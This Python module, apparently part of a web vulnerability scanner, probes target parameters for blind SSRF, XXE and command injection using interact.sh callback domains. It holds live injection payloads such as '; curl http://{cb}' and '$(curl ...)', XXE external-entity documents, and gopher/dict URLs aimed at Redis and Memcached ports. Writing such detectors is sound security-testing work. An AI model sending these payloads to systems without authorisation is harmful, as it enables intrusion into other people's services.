import sys
import os
import re
import uuid
import asyncio
import json
from typing import List, Dict, Optional
from urllib.parse import quote, urlencode, urlsplit, urlunsplit, parse_qsl

# Assuming core modules are available
from core.async_network import AsyncNetworkEngine
from core.ui import ph, i, p, w, s, draw_table, G, Y, R, N, GY, W, C, B


from runners.shared import inject_query_payload

try:
    from interactsh import InteractshClient as PiInteractshClient
    INTERACTSH_AVAILABLE = True
except ImportError:
    INTERACTSH_AVAILABLE = False


class InteractshClient:
    """Wrapper for python-interactsh (ASYNC library, used with await directly)."""

    def __init__(self):
        self._client = PiInteractshClient() if INTERACTSH_AVAILABLE else None
        self.domain = ""
        self.hits = []
        self.running = False
        self._initialized = False

    async def _register(self) -> bool:
        """Initialize + get domain from interactsh."""
        if not self._client:
            return False
        try:
            await self._client.initialize()
            self._initialized = True
            self.domain = await self._client.domain()
            return bool(self.domain)
        except Exception:
            return False

    async def _poll(self) -> List[Dict]:
        """Poll once and collect interactions."""
        if not self._client or not self._initialized:
            return []
        try:
            interactions = await self._client.poll_once()
            for interaction in interactions:
                self.hits.append({
                    "protocol": getattr(interaction, "protocol", ""),
                    "remote": getattr(interaction, "remote_address", ""),
                    "timestamp": getattr(interaction, "timestamp", ""),
                    "raw": getattr(interaction, "raw_request", ""),
                })
            if len(self.hits) > 2000:
                self.hits = self.hits[-2000:]
            return self.hits
        except Exception:
            return []

    async def _stop(self):
        """Cleanup."""
        self.running = False
        if self._client:
            try:
                await self._client.close()
                await asyncio.sleep(0.25)
            except Exception:
                pass

    def get_hits(self, marker: str) -> List[Dict]:
        matched = [h for h in self.hits if marker in str(h)]
        self.hits = [h for h in self.hits if marker not in str(h)]
        return matched


class OOBDetector:
    """
    Async Out-of-Band / Blind vulnerability detection engine using interact.sh.
    Replaces the legacy local port-forwarding HTTP server.
    """
    def __init__(self, target: str, services: List[Dict], params: Dict,
                 network_engine: AsyncNetworkEngine, session_manager=None,
                 allow_post: bool = True):
        self.target = target
        self.services = services
        self.params = params
        self.engine = network_engine
        self.session_manager = session_manager
        self.findings: List[Dict] = []
        self.interactsh = InteractshClient()
        self.allow_post = allow_post

    def _generate_marker(self, prefix: str) -> str:
        return f"{prefix}-{uuid.uuid4().hex[:8]}"

    def _blind_ssrf_payloads(self, marker: str) -> List[str]:
        cb = f"{marker}.{self.interactsh.domain}"
        return [
            f"http://{cb}",
            f"https://{cb}",
            f"http://{cb}/admin",
            f"gopher://{cb}:6379/_INFO",
            f"dict://{cb}:11211/"
        ]

    def _blind_xxe_payloads(self, marker: str) -> List[str]:
        cb = f"http://{marker}.{self.interactsh.domain}/xxe"
        return [
            f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{cb}">]><root>&xxe;</root>',
            f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{cb}">%xxe;]><root>test</root>'
        ]

    def _blind_rce_payloads(self, marker: str) -> List[str]:
        cb = f"{marker}.{self.interactsh.domain}"
        return [
            f"; curl http://{cb}",
            f"| curl http://{cb}",
            f"`curl http://{cb}`",
            f"$(curl http://{cb})",
            f"; ping -c 1 {cb}",
            f"| nslookup {cb}"
        ]

    async def _test_target(self, task_type: str, url: str, param: Optional[str]):
        marker = self._generate_marker(task_type)
        payloads = []
        
        if task_type == "ssrf":
            payloads = self._blind_ssrf_payloads(marker)
        elif task_type == "xxe":
            payloads = self._blind_xxe_payloads(marker)
        elif task_type == "rce":
            payloads = self._blind_rce_payloads(marker)

        for payload in payloads:
            if task_type == "xxe":
                await self.engine.ahttp_send(
                    url,
                    method="POST",
                    data=payload,
                    headers={"Content-Type": "text/xml"},
                    bypass=True,
                    state_context=self.session_manager,
                )
            elif param:
                target = inject_query_payload(url, param, payload)
                await self.engine.ahttp_send(target, bypass=True, state_context=self.session_manager)
            # Micro-sleep to avoid totally overwhelming the connection pool
            await asyncio.sleep(0.05)

        # We don't block here. Polling happens in the background.
        return marker, url, param

    def _build_tasks(self) -> List:
        """Bangun daftar task blind. Task 'xxe' = POST-only (XML body),
        jadi dibuang kalau allow_post=False (mode selain 4)."""
        tasks = []
        for path, plist in self.params.items():
            for sv in self.services:
                base_url = sv["url"].rstrip("/") + (path if path.startswith("/") else "/" + path)
                for param in plist[:3]:
                    tasks.append(self._test_target("ssrf", base_url, param))
                    tasks.append(self._test_target("rce", base_url, param))

        if self.allow_post:
            for sv in self.services:
                tasks.append(self._test_target("xxe", sv["url"], None))
        return tasks

    async def run(self) -> List[Dict]:
        ph("OOB DETECTOR: Async Blind Vulnerability Hunting (Interact.sh)")

        success = await self.interactsh._register()
        if not success:
            w("Interact.sh protocol client is not configured yet. Skipping OOB phase.")
            return []

        s(f"Interact.sh Payload Domain: {G}{self.interactsh.domain}{N}")

        # Background polling loop — now async natively
        async def poll_loop():
            self.interactsh.running = True
            while self.interactsh.running:
                await self.interactsh._poll()
                await asyncio.sleep(3)

        poll_task = asyncio.create_task(poll_loop())

        try:
            tasks = self._build_tasks()

            i(f"Dispatching {W}{len(tasks)}{N} async blind payloads...")

            # Execute concurrently
            results = await asyncio.gather(*tasks, return_exceptions=True)

            i("Waiting 3 seconds for DNS/HTTP propagation and callbacks...")
            await asyncio.sleep(3)

            # Poll one last time before checking
            await self.interactsh._poll()

            # Check hits
            for result in results:
                if not isinstance(result, tuple):
                    continue
                marker, url, param = result
                hits = self.interactsh.get_hits(marker)
                if hits:
                    task_type = marker.split("-")[0]
                    self.findings.append({
                        "type": f"blind_{task_type}",
                        "title": f"Blind {task_type.upper()} (OOB Confirmed)",
                        "url": url,
                        "detail": f"Param: {param}, Intercepted via {self.interactsh.domain}",
                        "bypass": "enabled",
                        "waf": "",
                        "time": 0,
                        "status": 0,
                        "confidence": "confirmed",
                    })
                    s(f"{R}BLIND VULN CONFIRMED:{N} {W}{task_type.upper()}{N} at {C}{url[:60]}{N}")
        finally:
            poll_task.cancel()
            await self.interactsh._stop()

        if self.findings:
            rows = [[f"{R}BLIND{N}", f"{W}{f['title']}{N}", f"{C}{f['url'][:50]}{N}"] for f in self.findings]
            draw_table(["TYPE", "VULNERABILITY", "TARGET"], rows, title="Interact.sh OOB Results")
        else:
            p("No blind vulnerabilities detected via Interactsh.")

        p(f"Blind findings: {R if self.findings else G}{len(self.findings)}{N}")
        return self.findings
